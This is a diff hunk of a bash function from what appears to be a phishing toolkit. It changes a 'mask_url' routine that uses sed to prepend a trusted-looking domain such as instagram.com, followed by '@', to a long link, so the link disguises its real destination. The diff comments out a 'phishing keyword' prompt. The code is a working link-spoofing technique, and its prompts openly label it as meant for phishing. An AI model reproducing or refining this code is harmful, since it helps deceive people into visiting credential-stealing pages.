@@ -184,10 +184,10 @@ mask_url() {
     echo -e -n "\n${YELLOW} [ ? ] Enter your custom domain (e.g., instagram.com): ${YELLOW}"
     read -r custom_domain
     
-    echo -e -n "\n${YELLOW} [ ? ] Enter phishing keyword (e.g., account, login): ${YELLOW}"
-    read -r phish_keyword
+    #echo -e -n "\n${YELLOW} [ ? ] Enter phishing keyword (e.g., account, login): ${YELLOW}"
+    #read -r phish_keyword
     
-    local masked_url=$(echo "$long_url" | sed "s|//|://${custom_domain}-${phish_keyword}@|")
+    local masked_url=$(echo "$long_url" | sed "s|//|://${custom_domain}@|")
    
     echo -e "${YELLOW} \nMasked url: "
     echo -e "------------------------------------------------"
